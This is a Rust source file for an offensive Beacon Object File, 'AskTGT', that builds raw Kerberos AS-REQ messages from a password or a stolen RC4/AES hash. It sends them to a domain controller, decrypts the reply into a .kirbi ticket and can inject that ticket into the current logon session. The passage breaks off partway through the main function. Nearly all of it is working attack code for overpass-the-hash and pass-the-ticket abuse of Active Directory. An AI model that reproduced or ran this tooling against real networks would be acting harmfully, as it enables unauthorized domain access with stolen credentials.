//! # AskTGT BOF
//!
//! Requests a Kerberos TGT via raw AS-REQ with pre-authentication.
//! Supports password, RC4 hash, or AES256 hash. Builds the encrypted
//! timestamp PA-DATA using CDLocateCSystem, sends to KDC port 88,
//! parses AS-REP, and outputs a base64-encoded .kirbi.
//!
//! ## MITRE ATT&CK
//! - T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
//!
//! ## Arguments
//! - `/user:USER` - Username (required)
//! - `/password:PASSWORD` - Plaintext password
//! - `/rc4:HASH` - RC4-HMAC (NTLM) hash
//! - `/aes256:HASH` - AES256 hash
//! - `/domain:DOMAIN` - Target domain (auto-detected if omitted)
//! - `/dc:DC` - Domain controller hostname or IP (auto-detected if omitted)
//! - `/enctype:rc4|aes256` - Encryption type (default: rc4)
//! - `/ptt` - Import ticket into current session
//! - `/nopac` - Request ticket without PAC

#![no_std]

use alloc::string::String;
use alloc::vec;
use alloc::vec::Vec;
use core::ffi::c_void;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Networking::WinSock::*;
use windows_sys::Win32::Security::Authentication::Identity::*;
use windows_sys::Win32::Security::*;
use windows_sys::Win32::System::Threading::*;


struct Asn {
    class: u8,
    tag: u32,
    value: Vec<u8>,
    children: Vec<Asn>,
}

fn parse_asn(data: &[u8]) -> Option<Asn> {
    let (elem, _) = parse_one(data, 0)?;
    Some(elem)
}

fn parse_one(data: &[u8], mut pos: usize) -> Option<(Asn, usize)> {
    if pos >= data.len() { return None; }
    let b = data[pos]; pos += 1;
    let class = (b >> 6) & 0x03;
    let constructed = (b & 0x20) != 0;
    let mut tag = (b & 0x1F) as u32;
    if tag == 0x1F {
        tag = 0;
        loop {
            if pos >= data.len() { return None; }
            let b = data[pos]; pos += 1;
            tag = (tag << 7) | (b & 0x7F) as u32;
            if b & 0x80 == 0 { break; }
        }
    }
    if pos >= data.len() { return None; }
    let len_byte = data[pos]; pos += 1;
    let length = if len_byte < 0x80 {
        len_byte as usize
    } else if len_byte == 0x80 {
        return None;
    } else {
        let num = (len_byte & 0x7F) as usize;
        if pos + num > data.len() { return None; }
        let mut l = 0usize;
        for i in 0..num { l = (l << 8) | data[pos + i] as usize; }
        pos += num;
        l
    };
    if pos + length > data.len() { return None; }
    let value = data[pos..pos + length].to_vec();
    let children = if constructed { parse_children(&value) } else { Vec::new() };
    Some((Asn { class, tag, value, children }, pos + length))
}

fn parse_children(data: &[u8]) -> Vec<Asn> {
    let mut children = Vec::new();
    let mut pos = 0;
    while pos < data.len() {
        if let Some((child, new_pos)) = parse_one(data, pos) {
            children.push(child);
            pos = new_pos;
        } else { break; }
    }
    children
}

fn find_ctx<'a>(asn: &'a Asn, tag: u32) -> Option<&'a Asn> {
    asn.children.iter().find(|c| c.class == 2 && c.tag == tag)
}

fn get_int(asn: &Asn) -> i64 {
    let data = &asn.value;
    if data.is_empty() { return 0; }
    let mut val = if data[0] & 0x80 != 0 { -1i64 } else { 0i64 };
    for &b in data { val = (val << 8) | b as i64; }
    val
}

fn get_string(asn: &Asn) -> String {
    String::from_utf8_lossy(&asn.value).into_owned()
}

fn get_octet_string(asn: &Asn) -> Vec<u8> {
    asn.value.clone()
}


fn asn_tag_len(tag_byte: u8, data: &[u8]) -> Vec<u8> {
    let mut out = vec![tag_byte];
    let l = data.len();
    if l < 0x80 {
        out.push(l as u8);
    } else if l < 0x100 {
        out.push(0x81);
        out.push(l as u8);
    } else if l < 0x10000 {
        out.push(0x82);
        out.push((l >> 8) as u8);
        out.push(l as u8);
    } else {
        out.push(0x83);
        out.push((l >> 16) as u8);
        out.push((l >> 8) as u8);
        out.push(l as u8);
    }
    out.extend_from_slice(data);
    out
}

fn asn_seq(children: &[&[u8]]) -> Vec<u8> {
    let mut data = Vec::new();
    for c in children { data.extend_from_slice(c); }
    asn_tag_len(0x30, &data)
}

fn asn_ctx(tag: u8, inner: &[u8]) -> Vec<u8> {
    asn_tag_len(0xa0 | tag, inner)
}

fn asn_app(tag: u8, inner: &[u8]) -> Vec<u8> {
    asn_tag_len(0x60 | tag, inner)
}

fn asn_int(val: i64) -> Vec<u8> {
    if val == 0 { return vec![0x02, 0x01, 0x00]; }
    let mut bytes = Vec::new();
    let mut v = val;
    if val > 0 {
        while v > 0 { bytes.push((v & 0xff) as u8); v >>= 8; }
        bytes.reverse();
        if bytes[0] & 0x80 != 0 { bytes.insert(0, 0); }
    } else {
        while v < -1 { bytes.push((v & 0xff) as u8); v >>= 8; }
        bytes.push((v & 0xff) as u8);
        bytes.reverse();
    }
    let mut out = vec![0x02, bytes.len() as u8];
    out.extend_from_slice(&bytes);
    out
}

fn asn_oct(data: &[u8]) -> Vec<u8> { asn_tag_len(0x04, data) }

fn asn_str(s: &str) -> Vec<u8> { asn_tag_len(0x1b, s.as_bytes()) } // GeneralString

fn asn_bit(data: &[u8]) -> Vec<u8> {
    let mut out = vec![0x03];
    let l = data.len() + 1;
    if l < 0x80 { out.push(l as u8); }
    else { out.push(0x81); out.push(l as u8); }
    out.push(0x00); // unused bits
    out.extend_from_slice(data);
    out
}

fn asn_time(s: &str) -> Vec<u8> { asn_tag_len(0x18, s.as_bytes()) }

fn asn_ctx_int(tag: u8, val: i64) -> Vec<u8> {
    let i = asn_int(val);
    asn_ctx(tag, &i)
}

fn asn_ctx_str(tag: u8, s: &str) -> Vec<u8> {
    let v = asn_str(s);
    asn_ctx(tag, &v)
}


const RC4_HMAC: i32 = 23;
const AES256_CTS: i32 = 18;
const AES128_CTS: i32 = 17;

#[repr(C)]
struct UnicodeStr { length: u16, maximum_length: u16, buffer: *mut u16 }
#[repr(C)]
struct AnsiStr { length: u16, maximum_length: u16, buffer: *const u8 }

type HashPasswordNt6 = unsafe extern "system" fn(*const UnicodeStr, *const UnicodeStr, u32, *mut u8) -> i32;
type EncryptFn = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u8, *mut u32) -> i32;
type DecryptFn = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u8, *mut u32) -> i32;
type InitializeFn = unsafe extern "system" fn(*const u8, u32, u32, *mut *mut c_void) -> i32;
type FinishFn = unsafe extern "system" fn(*mut *mut c_void) -> i32;

#[repr(C)]
struct KerbEcrypt {
    encryption_type: u32,
    block_size: u32,
    exportable_encryption_type: u32,
    key_size: u32,
    header_size: u32,
    preferred_checksum: u32,
    attributes: u32,
    name: *const u16,
    initialize: InitializeFn,
    encrypt: EncryptFn,
    decrypt: DecryptFn,
    finish: FinishFn,
    hash_password: HashPasswordNt6,
    random_key: *const c_void,
    control: *const c_void,
    unk0: *const c_void,
    unk1: *const c_void,
    unk2: *const c_void,
}

type CDLocateCSystemFn = unsafe extern "system" fn(i32, *mut *const KerbEcrypt) -> i32;
type RtlInitAnsiStringFn = unsafe extern "system" fn(*mut AnsiStr, *const u8);
type RtlAnsiToUnicodeFn = unsafe extern "system" fn(*mut UnicodeStr, *const AnsiStr, u8) -> i32;
type RtlFreeUnicodeStringFn = unsafe extern "system" fn(*mut UnicodeStr);
type SystemFunction036Fn = unsafe extern "system" fn(*mut u8, u32) -> u8;

unsafe extern "system" {
    fn LoadLibraryA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
    fn GetModuleHandleA(name: *const u8) -> *mut c_void;
}

struct CryptApi {
    cd_locate: CDLocateCSystemFn,
    rtl_init_ansi: RtlInitAnsiStringFn,
    rtl_ansi_to_unicode: RtlAnsiToUnicodeFn,
    rtl_free_unicode: RtlFreeUnicodeStringFn,
    rand: SystemFunction036Fn,
}

fn load_crypt_api() -> Option<CryptApi> {
    unsafe {
        let cryptdll = {
            let h = GetModuleHandleA(b"CRYPTDLL\0".as_ptr());
            if h.is_null() { LoadLibraryA(b"CRYPTDLL\0".as_ptr()) } else { h }
        };
        if cryptdll.is_null() { return None; }
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
        if ntdll.is_null() { return None; }
        let advapi = {
            let h = GetModuleHandleA(b"ADVAPI32\0".as_ptr());
            if h.is_null() { LoadLibraryA(b"ADVAPI32\0".as_ptr()) } else { h }
        };
        if advapi.is_null() { return None; }

        macro_rules! r {
            ($m:expr, $n:literal) => {{
                let p = GetProcAddress($m, concat!($n, "\0").as_ptr());
                if p.is_null() { return None; }
                core::mem::transmute(p)
            }};
        }
        Some(CryptApi {
            cd_locate: r!(cryptdll, "CDLocateCSystem"),
            rtl_init_ansi: r!(ntdll, "RtlInitAnsiString"),
            rtl_ansi_to_unicode: r!(ntdll, "RtlAnsiStringToUnicodeString"),
            rtl_free_unicode: r!(ntdll, "RtlFreeUnicodeString"),
            rand: r!(advapi, "SystemFunction036"),
        })
    }
}

fn str_to_unicode(api: &CryptApi, s: &str) -> Option<UnicodeStr> {
    unsafe {
        let mut cstr = Vec::with_capacity(s.len() + 1);
        cstr.extend_from_slice(s.as_bytes());
        cstr.push(0);
        let mut ansi = core::mem::zeroed::<AnsiStr>();
        (api.rtl_init_ansi)(&mut ansi, cstr.as_ptr());
        let mut uni = core::mem::zeroed::<UnicodeStr>();
        if (api.rtl_ansi_to_unicode)(&mut uni, &ansi, 1) >= 0 { Some(uni) } else { None }
    }
}

fn derive_key(api: &CryptApi, etype: i32, password: &str, salt: &str) -> Option<Vec<u8>> {
    unsafe {
        let mut csys: *const KerbEcrypt = core::ptr::null();
        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() { return None; }
        let ks = (*csys).key_size as usize;
        let mut key = vec![0u8; ks];
        let mut pw = str_to_unicode(api, password)?;
        let mut sa = str_to_unicode(api, salt)?;
        let r = ((*csys).hash_password)(&pw, &sa, 4096, key.as_mut_ptr());
        (api.rtl_free_unicode)(&mut pw);
        (api.rtl_free_unicode)(&mut sa);
        if r >= 0 { Some(key) } else { None }
    }
}

fn encrypt_data(api: &CryptApi, key: &[u8], etype: i32, key_usage: u32, plaintext: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut csys: *const KerbEcrypt = core::ptr::null();
        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() { return None; }
        let mut ctx: *mut c_void = core::ptr::null_mut();
        if ((*csys).initialize)(key.as_ptr(), (*csys).key_size, key_usage, &mut ctx) < 0 { return None; }
        let mut out_size = plaintext.len();
        let block_size = (*csys).block_size as usize;
        if block_size > 0 {
            let modulo = out_size % block_size;
            if modulo != 0 { out_size += block_size - modulo; }
        }
        out_size += (*csys).header_size as usize;
        let mut output = vec![0u8; out_size];
        let mut actual_size = out_size as u32;
        let r = ((*csys).encrypt)(ctx, plaintext.as_ptr(), plaintext.len() as u32, output.as_mut_ptr(), &mut actual_size);
        ((*csys).finish)(&mut ctx);
        if r >= 0 { output.truncate(actual_size as usize); Some(output) } else { None }
    }
}

fn decrypt_data(api: &CryptApi, key: &[u8], etype: i32, key_usage: u32, ciphertext: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut csys: *const KerbEcrypt = core::ptr::null();
        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() { return None; }
        let mut ctx: *mut c_void = core::ptr::null_mut();
        if ((*csys).initialize)(key.as_ptr(), (*csys).key_size, key_usage, &mut ctx) < 0 { return None; }
        let mut output = vec![0u8; ciphertext.len()];
        let mut actual_size = ciphertext.len() as u32;
        let r = ((*csys).decrypt)(ctx, ciphertext.as_ptr(), ciphertext.len() as u32, output.as_mut_ptr(), &mut actual_size);
        ((*csys).finish)(&mut ctx);
        if r >= 0 { output.truncate(actual_size as usize); Some(output) } else { None }
    }
}


fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut wsa_data = core::mem::zeroed::<WSADATA>();
        WSAStartup(0x0202, &mut wsa_data);

        let mut server_cstr = Vec::with_capacity(server.len() + 1);
        server_cstr.extend_from_slice(server.as_bytes());
        server_cstr.push(0);

        let mut hints = core::mem::zeroed::<ADDRINFOA>();
        hints.ai_family = AF_INET as i32;
        hints.ai_socktype = SOCK_STREAM as i32;
        hints.ai_protocol = IPPROTO_TCP as i32;

        let mut result: *mut ADDRINFOA = core::ptr::null_mut();
        if getaddrinfo(server_cstr.as_ptr(), b"88\0".as_ptr(), &hints, &mut result) != 0 {
            WSACleanup();
            return None;
        }

        let mut sock: SOCKET = INVALID_SOCKET;
        let mut ptr = result;
        while !ptr.is_null() {
            let ai = &*ptr;
            sock = socket(ai.ai_family, ai.ai_socktype, ai.ai_protocol);
            if sock != INVALID_SOCKET {
                if connect(sock, ai.ai_addr, ai.ai_addrlen as i32) == 0 { break; }
                closesocket(sock);
                sock = INVALID_SOCKET;
            }
            ptr = ai.ai_next;
        }
        freeaddrinfo(result);

        if sock == INVALID_SOCKET {
            WSACleanup();
            return None;
        }

        let len_be = (data.len() as u32).to_be_bytes();
        send(sock, len_be.as_ptr(), 4, 0);
        send(sock, data.as_ptr(), data.len() as i32, 0);

        let mut size_buf = [0u8; 4];
        if recv(sock, size_buf.as_mut_ptr(), 4, 0) < 4 {
            closesocket(sock);
            WSACleanup();
            return None;
        }

        let resp_size = (u32::from_be_bytes(size_buf) & 0x7fffffff) as usize;
        if resp_size == 0 || resp_size > 1024 * 1024 {
            closesocket(sock);
            WSACleanup();
            return None;
        }

        let mut response = vec![0u8; resp_size];
        let mut received = 0usize;
        while received < resp_size {
            let n = recv(sock, response.as_mut_ptr().add(received), (resp_size - received) as i32, 0);
            if n <= 0 { break; }
            received += n as usize;
        }

        closesocket(sock);
        WSACleanup();

        if received == resp_size { Some(response) } else { None }
    }
}


#[repr(C)]
struct DomainControllerInfoA {
    dc_name: *mut u8,
    dc_address: *mut u8,
    dc_address_type: u32,
    domain_guid: [u8; 16],
    domain_name: *mut u8,
    dns_forest_name: *mut u8,
    flags: u32,
    dc_site_name: *mut u8,
    client_site_name: *mut u8,
}

unsafe extern "system" {
    fn GetComputerNameA(buf: *mut u8, size: *mut u32) -> i32;
}

type DsGetDcNameAFn = unsafe extern "system" fn(
    *const u8, *const u8, *const c_void, *const u8, u32, *mut *mut DomainControllerInfoA,
) -> u32;
type NetApiBufferFreeFn = unsafe extern "system" fn(*mut c_void) -> u32;

fn get_domain_info() -> Option<(String, String)> {
    unsafe {
        let netapi = {
            let h = GetModuleHandleA(b"NETAPI32\0".as_ptr());
            if h.is_null() { LoadLibraryA(b"NETAPI32\0".as_ptr()) } else { h }
        };
        if netapi.is_null() { return None; }

        let ds_get: DsGetDcNameAFn = core::mem::transmute(GetProcAddress(netapi, b"DsGetDcNameA\0".as_ptr()));
        let free_fn: NetApiBufferFreeFn = core::mem::transmute(GetProcAddress(netapi, b"NetApiBufferFree\0".as_ptr()));

        let mut info: *mut DomainControllerInfoA = core::ptr::null_mut();
        if ds_get(core::ptr::null(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0x40000010, &mut info) != 0 {
            return None;
        }
        if info.is_null() { return None; }

        let domain = cstr_to_string((*info).domain_name);
        let dc_raw = cstr_to_string((*info).dc_name);
        let dc = String::from(dc_raw.trim_start_matches('\\'));
        free_fn(info as *mut c_void);
        Some((domain, dc))
    }
}

fn cstr_to_string(ptr: *const u8) -> String {
    if ptr.is_null() { return String::new(); }
    unsafe {
        let mut len = 0;
        while *ptr.add(len) != 0 { len += 1; }
        String::from_utf8_lossy(core::slice::from_raw_parts(ptr, len)).into_owned()
    }
}


fn base64_encode(input: &[u8]) -> String {
    const C: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let ol = 4 * ((input.len() + 2) / 3);
    let mut o = Vec::with_capacity(ol);
    let mut i = 0;
    while i < input.len() {
        let a = input[i] as u32; i += 1;
        let b = if i < input.len() { let v = input[i] as u32; i += 1; v } else { i += 1; 0 };
        let c = if i < input.len() { let v = input[i] as u32; i += 1; v } else { i += 1; 0 };
        let t = (a << 16) | (b << 8) | c;
        o.push(C[((t >> 18) & 0x3F) as usize]);
        o.push(C[((t >> 12) & 0x3F) as usize]);
        o.push(C[((t >> 6) & 0x3F) as usize]);
        o.push(C[(t & 0x3F) as usize]);
    }
    match input.len() % 3 {
        1 => { if ol >= 2 { o[ol - 1] = b'='; o[ol - 2] = b'='; } }
        2 => { if ol >= 1 { o[ol - 1] = b'='; } }
        _ => {}
    }
    unsafe { String::from_utf8_unchecked(o) }
}


fn get_current_time() -> String {
    unsafe {
        let mut st = core::mem::zeroed::<SYSTEMTIME>();
        GetSystemTime(&mut st);
        alloc::format!("{:04}{:02}{:02}{:02}{:02}{:02}Z",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond)
    }
}

fn get_future_time(hours: u16) -> String {
    unsafe {
        let mut st = core::mem::zeroed::<SYSTEMTIME>();
        GetSystemTime(&mut st);
        st.wHour += hours;
        if st.wHour >= 24 { st.wHour -= 24; st.wDay += 1; }
        alloc::format!("{:04}{:02}{:02}{:02}{:02}{:02}Z",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond)
    }
}

unsafe extern "system" {
    fn GetSystemTime(st: *mut SYSTEMTIME);
    fn Sleep(ms: u32);
}

fn build_as_req(
    api: &CryptApi, user: &str, domain: &str, key: &[u8], etype: i32, pac: bool,
) -> Option<Vec<u8>> {
    let mut nonce = [0u8; 4];
    unsafe { (api.rand)(nonce.as_mut_ptr(), 4); }
    let nonce_val = u32::from_le_bytes(nonce) as i64;

    let kdc_options: u32 = 0x40810010; // forwardable | renewable | canonicalize | renewable-ok
    let kdc_opts_bytes = kdc_options.to_be_bytes();

    let enc_timestamp = build_enc_timestamp(api, key, etype)?;
    let enc_ts_encoded = {
        let enc_data = asn_seq(&[
            &asn_ctx_int(0, etype as i64),
            &asn_ctx(2, &asn_oct(&enc_timestamp)),
        ]);
        let mut enc_data_bytes = Vec::new();
        let padata_type = asn_ctx_int(1, 2); // PADATA_ENC_TIMESTAMP = 2
        let padata_value = asn_ctx(2, &asn_oct(&enc_data));
        enc_data_bytes = asn_seq(&[&padata_type, &padata_value]);
        enc_data_bytes
    };

    let pac_request = {
        let pac_blob = if pac {
            vec![0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0x01]
        } else {
            vec![0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0x00]
        };
        let padata_type = asn_ctx_int(1, 128); // PADATA_PA_PAC_REQUEST = 128
        let padata_value = asn_ctx(2, &asn_oct(&pac_blob));
        asn_seq(&[&padata_type, &padata_value])
    };

    let pa_data_seq = asn_seq(&[&enc_ts_encoded, &pac_request]);
    let pa_data_ctx = asn_ctx(3, &pa_data_seq);

    let cname = {
        let name_type = asn_ctx_int(0, 1); // NT_PRINCIPAL
        let name_str = asn_ctx(1, &asn_seq(&[&asn_str(user)]));
        asn_seq(&[&name_type, &name_str])
    };

    let sname = {
        let name_type = asn_ctx_int(0, 2); // NT_SRV_INST
        let name_str = asn_ctx(1, &asn_seq(&[&asn_str("krbtgt"), &asn_str(domain)]));
        asn_seq(&[&name_type, &name_str])
    };

    let till = get_future_time(24);
    let etype_seq = asn_seq(&[&asn_int(etype as i64)]);

    let req_body = asn_seq(&[
        &asn_ctx(0, &asn_bit(&kdc_opts_bytes)),
        &asn_ctx(1, &cname),
        &asn_ctx_str(2, domain),
        &asn_ctx(3, &sname),
        &asn_ctx(5, &asn_time(&till)),
        &asn_ctx_int(7, nonce_val),
        &asn_ctx(8, &etype_seq),
    ]);

    let as_req_body = asn_seq(&[
        &asn_ctx_int(1, 5),     // pvno
        &asn_ctx_int(2, 10),    // msg-type (AS-REQ)
        &pa_data_ctx,
        &asn_ctx(4, &req_body),
    ]);

    let encoded = asn_app(10, &as_req_body);
    Some(encoded)
}

fn build_enc_timestamp(api: &CryptApi, key: &[u8], etype: i32) -> Option<Vec<u8>> {
    let now = get_current_time();
    let timestamp_asn = asn_seq(&[&asn_ctx(0, &asn_time(&now))]);
    encrypt_data(api, key, etype, 1, &timestamp_asn)
}


fn handle_as_rep(
    api: &CryptApi, response: &[u8], key: &[u8], etype: i32,
) -> Option<String> {
    let root = parse_asn(response)?;

    if root.tag == 30 {
        let body = root.children.first()?;
        if let Some(err_ctx) = find_ctx(body, 6) {
            if let Some(err_code) = err_ctx.children.first() {
                let code = get_int(err_code);
                eprintln!("\n\t[X] Kerberos error: {}", code);
                match code {
                    6 => eprintln!("\t    KDC_ERR_C_PRINCIPAL_UNKNOWN - client not found"),
                    24 => eprintln!("\t    KDC_ERR_PREAUTH_FAILED - bad password or wrong etype"),
                    25 => eprintln!("\t    KDC_ERR_PREAUTH_REQUIRED - pre-auth required"),
                    _ => {}
                }
            }
        }
        return None;
    }

    if root.tag != 11 {
        eprintln!("[X] Unexpected response tag: {}", root.tag);
        return None;
    }

    let body = root.children.first()?;

    let crealm = find_ctx(body, 3)
        .and_then(|c| c.children.first())
        .map(|c| get_string(c))
        .unwrap_or_default();

    let ticket_ctx = find_ctx(body, 5)?;
    let ticket_raw = &ticket_ctx.value;

    let enc_part_ctx = find_ctx(body, 6)?;
    let enc_data_seq = enc_part_ctx.children.first()?;

    let rep_etype = find_ctx(enc_data_seq, 0)
        .and_then(|c| c.children.first())
        .map(|c| get_int(c) as i32)
        .unwrap_or(0);

    let cipher = find_ctx(enc_data_seq, 2)
        .and_then(|c| c.children.first())
        .map(|c| get_octet_string(c))?;

    let key_usage: u32 = if rep_etype == AES128_CTS || rep_etype == AES256_CTS { 3 } else { 8 };
    let plaintext = decrypt_data(api, key, etype, key_usage, &cipher)?;

    let dec_asn = parse_asn(&plaintext)?;
    if dec_asn.tag != 25 {
        eprintln!("[X] Failed to decrypt TGT - wrong password/hash or encryption type mismatch");
        return None;
    }

    let enc_rep = dec_asn.children.first()?;
    let session_key_ctx = find_ctx(enc_rep, 0)?;
    let session_key_seq = session_key_ctx.children.first()?;
    let sk_type = find_ctx(session_key_seq, 0)
        .and_then(|c| c.children.first())
        .map(|c| get_int(c))
        .unwrap_or(0);
    let sk_value = find_ctx(session_key_seq, 1)
        .and_then(|c| c.children.first())
        .map(|c| get_octet_string(c))
        .unwrap_or_default();

    let flags_raw = find_ctx(enc_rep, 5)
        .and_then(|c| c.children.first())
        .map(|c| &c.value)
        .cloned()
        .unwrap_or_default();

    let starttime = find_ctx(enc_rep, 6)
        .and_then(|c| c.children.first())
        .map(|c| get_string(c))
        .unwrap_or_default();
    let endtime = find_ctx(enc_rep, 7)
        .and_then(|c| c.children.first())
        .map(|c| get_string(c))
        .unwrap_or_default();
    let renew_till = find_ctx(enc_rep, 8)
        .and_then(|c| c.children.first())
        .map(|c| get_string(c))
        .unwrap_or_default();
    let srealm = find_ctx(enc_rep, 9)
        .and_then(|c| c.children.first())
        .map(|c| get_string(c))
        .unwrap_or_default();

    let cname_ctx = find_ctx(body, 4)?;
    let cname_raw = &cname_ctx.value;

    let sname_ctx = find_ctx(enc_rep, 10);
    let sname_raw = sname_ctx.map(|c| &c.value);

    let session_key_asn = asn_ctx(0, &asn_seq(&[
        &asn_ctx_int(0, sk_type),
        &asn_ctx(1, &asn_oct(&sk_value)),
    ]));
    let prealm_asn = asn_ctx_str(1, &crealm);
    let pname_asn = asn_ctx(2, cname_raw);
    let flags_asn = if flags_raw.len() > 0 { asn_ctx(3, &flags_raw) } else { Vec::new() };
    let start_asn = if !starttime.is_empty() { asn_ctx(6, &asn_time(&starttime)) } else { Vec::new() };
    let end_asn = asn_ctx(7, &asn_time(&endtime));
    let renew_asn = if !renew_till.is_empty() { asn_ctx(8, &asn_time(&renew_till)) } else { Vec::new() };
    let srealm_asn = asn_ctx_str(9, &srealm);
    let sname_asn = if let Some(sr) = sname_raw { asn_ctx(10, sr) } else { Vec::new() };

    let mut cred_info_parts: Vec<&[u8]> = Vec::new();
    cred_info_parts.push(&session_key_asn);
    cred_info_parts.push(&prealm_asn);
    cred_info_parts.push(&pname_asn);
    if !flags_asn.is_empty() { cred_info_parts.push(&flags_asn); }
    if !start_asn.is_empty() { cred_info_parts.push(&start_asn); }
    cred_info_parts.push(&end_asn);
    if !renew_asn.is_empty() { cred_info_parts.push(&renew_asn); }
    cred_info_parts.push(&srealm_asn);
    if !sname_asn.is_empty() { cred_info_parts.push(&sname_asn); }

    let cred_info = asn_seq(&cred_info_parts);
    let enc_krb_cred_part = asn_app(29, &asn_seq(&[
        &asn_ctx(0, &asn_seq(&[&cred_info])),
    ]));

    let enc_data = asn_seq(&[
        &asn_ctx_int(0, 0),
        &asn_ctx(2, &asn_oct(&enc_krb_cred_part)),
    ]);

    let krb_cred = asn_app(22, &asn_seq(&[
        &asn_ctx_int(0, 5),
        &asn_ctx_int(1, 22),
        &asn_ctx(2, &asn_seq(&[ticket_raw.as_slice()])),
        &asn_ctx(3, &enc_data),
    ]));

    Some(base64_encode(&krb_cred))
}


fn get_param<'a>(params: &'a str, name: &str) -> Option<&'a str> {
    if let Some(pos) = params.find(name) {
        let after = &params[pos + name.len()..];
        let end = after.find(' ').unwrap_or(after.len());
        let value = &after[..end];
        if !value.is_empty() { return Some(value); }
    }
    None
}

fn has_flag(params: &str, name: &str) -> bool {
    params.contains(name)
}

fn hex_decode(s: &str) -> Option<Vec<u8>> {
    if s.len() % 2 != 0 { return None; }
    let mut out = Vec::with_capacity(s.len() / 2);
    let b = s.as_bytes();
    let mut i = 0;
    while i < b.len() {
        let hi = hex_digit(b[i])?;
        let lo = hex_digit(b[i + 1])?;
        out.push((hi << 4) | lo);
        i += 2;
    }
    Some(out)
}

fn hex_digit(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}


fn base64_decode_vec(input: &str) -> Option<Vec<u8>> {
    let input = input.as_bytes();
    let mut padding = 0;
    if input.is_empty() { return None; }
    if input[input.len() - 1] == b'=' { padding += 1; }
    if input.len() > 1 && input[input.len() - 2] == b'=' { padding += 1; }
    let out_len = (input.len() * 3) / 4 - padding;
    let mut output = Vec::with_capacity(out_len);
    let mut i = 0;
    while i < input.len() {
        let a = b64v(input[i]); i += 1;
        let b = if i < input.len() { b64v(input[i]) } else { 0 }; i += 1;
        let c = if i < input.len() { b64v(input[i]) } else { 0 }; i += 1;
        let d = if i < input.len() { b64v(input[i]) } else { 0 }; i += 1;
        let t = (a << 18) | (b << 12) | (c << 6) | d;
        if output.len() < out_len { output.push(((t >> 16) & 0xFF) as u8); }
        if output.len() < out_len { output.push(((t >> 8) & 0xFF) as u8); }
        if output.len() < out_len { output.push((t & 0xFF) as u8); }
    }
    Some(output)
}

fn b64v(c: u8) -> u32 {
    match c {
        b'A'..=b'Z' => (c - b'A') as u32, b'a'..=b'z' => (c - b'a' + 26) as u32,
        b'0'..=b'9' => (c - b'0' + 52) as u32, b'+' => 62, b'/' => 63, _ => 0,
    }
}

fn import_ticket(ticket_b64: &str) {
    let ticket_bytes = match base64_decode_vec(ticket_b64) {
        Some(b) if !b.is_empty() => b,
        _ => { eprintln!("[X] Failed to decode ticket"); return; }
    };

    unsafe {
        let mut hlsa: HANDLE = core::ptr::null_mut();
        if LsaConnectUntrusted(&mut hlsa) < 0 { eprintln!("[X] Failed to get LSA handle"); return; }

        let krb = LSA_STRING { Length: 8, MaximumLength: 9, Buffer: b"kerberos\0".as_ptr() as *mut u8 };
        let mut auth_pkg = 0u32;
        if LsaLookupAuthenticationPackage(hlsa, &krb, &mut auth_pkg) < 0 {
            LsaDeregisterLogonProcess(hlsa);
            return;
        }

        let submit_size = core::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>() + ticket_bytes.len();
        let mut buf = vec![0u8; submit_size];
        let req = &mut *(buf.as_mut_ptr() as *mut KERB_SUBMIT_TKT_REQUEST);
        req.MessageType = KerbSubmitTicketMessage;
        req.KerbCredSize = ticket_bytes.len() as u32;
        req.KerbCredOffset = core::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>() as u32;
        core::ptr::copy_nonoverlapping(
            ticket_bytes.as_ptr(),
            buf.as_mut_ptr().add(core::mem::size_of::<KERB_SUBMIT_TKT_REQUEST>()),
            ticket_bytes.len(),
        );

        let mut resp: *mut c_void = core::ptr::null_mut();
        let mut resp_size = 0u32;
        let mut proto_status = 0i32;
        let status = LsaCallAuthenticationPackage(
            hlsa, auth_pkg, buf.as_ptr() as *const c_void, submit_size as u32,
            &mut resp, &mut resp_size, &mut proto_status,
        );
        if status < 0 || proto_status < 0 {
            eprintln!("[X] Ticket not imported.");
        } else {
            println!("[+] Ticket successfully imported.");
        }
        LsaDeregisterLogonProcess(hlsa);
    }
}


#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    println!("[*] Action: Ask TGT\n");

    if len == 0 {
        eprintln!("[X] /user:X required. Usage: /user:USER /password:PASS [/domain:DOMAIN] [/dc:DC] [/enctype:rc4|aes256] [/ptt] [/nopac]");
        return;
    }

    let mut parser = DataParser::new(args, len);
    let params = String::from(parser.get_str());

    let user = match get_param(&params, "/user:") {
        Some(u) => u,
        None => { eprintln!("[X] /user:X must be supplied!"); return; }
    };

    let password = get_param(&params, "/password:");
    let rc4_hash = get_param(&params, "/rc4:");
    let aes256_hash = get_param(&params, "/aes256:");
    let ptt = has_flag(&params, "/ptt");
    let nopac = has_flag(&params, "/nopac");
    let enc_override = get_param(&params, "/enctype:");

    if password.is_none() && rc4_hash.is_none() && aes256_hash.is_none() {
        eprintln!("[X] /password:X, /rc4:HASH, or /aes256:HASH must be supplied!");
        return;
    }

    let domain_arg = get_param(&params, "/domain:");
    let dc_arg = get_param(&params, "/dc:");

    let (domain, dc) = if let (Some(d), Some(c)) = (domain_arg, dc_arg) {
        (String::from(d), String::from(c))
    } else {
